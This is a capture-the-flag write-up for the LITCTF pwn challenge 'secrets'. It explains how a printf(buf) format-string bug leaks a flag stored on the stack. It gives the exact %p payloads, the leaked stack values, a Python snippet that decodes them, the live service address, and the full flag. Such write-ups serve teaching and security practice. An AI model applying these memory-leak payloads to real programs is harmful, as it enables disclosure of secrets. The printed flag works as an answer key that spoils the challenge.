# secrets

**Category:** Pwn (format string) · **Points:** 169 · **Solves:** 75 · **Author:** w0152

**Flag:** `LITCTF{PRINTF-vULN3r4b1LitY-ZftvINYopu}`

## Challenge

> Ever wonder what happens behind the scenes of every C program?
>
> `nc 136.115.87.65 31779`

## The hint

*"behind the scenes of every C program"* → **`printf`**. And indeed the flag itself
spells it out: `PRINTF-vULN3r4b1LitY` = **printf vulnerability** (format string).

## Recon

The service reads a line and prints it back, then says `Nothing happened`. Testing with
`%p` shows it's passing our input **directly** to `printf(buf)` — a format-string bug:

```
send: AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
recv: AAAA.0x7ffc...c0.0x23.0x74d3edd61666.(nil).(nil).0x2e70252e41414141.…
```

- `0x2e70252e41414141` = `"AAAA.%p."` → our buffer starts at **arg offset 6**.
- `%3$p` leaks a libc address.

## Solution — leak the flag off the stack

The program loads `flag.txt` into a stack buffer before the vulnerable `printf`, so the
flag bytes are simply *there* on the stack. Dumping stack qwords finds them at
**offsets 14–18**:

```
%14$p = 0x507b46544354494c   -> "LITCTF{P"
%15$p = 0x55762d46544e4952   -> "RINTF-vU"
%16$p = 0x4c31623472334e4c   -> "LN3r4b1L"
%17$p = 0x7674665a2d597469   -> "itY-Zftv"
%18$p = 0x007d75706f594e49   -> "INYopu}"
```

Pack each little-endian qword and concatenate:

```python
payload = b"".join(b"%%%d$p," % i for i in range(13, 21))   # leak offsets 13..20
line    = send(payload)                                      # comma-delimited %p dump
vals    = [int(t,16) for t in line.split(",") if t.startswith("0x")]
blob    = b"".join(struct.pack("<Q", v) for v in vals)
# -> b'...LITCTF{PRINTF-vULN3r4b1LitY-ZftvINYopu}...'
```

No `%n` write or ret2win needed — the secret was already in memory, exactly as the
title teases.

> **Note on the handout:** the provided `main` binary (`main_handout`) is a *different*
> build — it uses `gets()` into a stack buffer and then `call`s a function pointer
> (a ret2win via overwriting the pointer with `win`), and prints via a **safe** `%s`.
> The live service instead has the `printf(buf)` format-string bug and pre-loads the
> flag onto the stack. The flag content (`PRINTF-vulnerability`) confirms the live
> service is the intended, format-string challenge.

## Flag

```
LITCTF{PRINTF-vULN3r4b1LitY-ZftvINYopu}
```
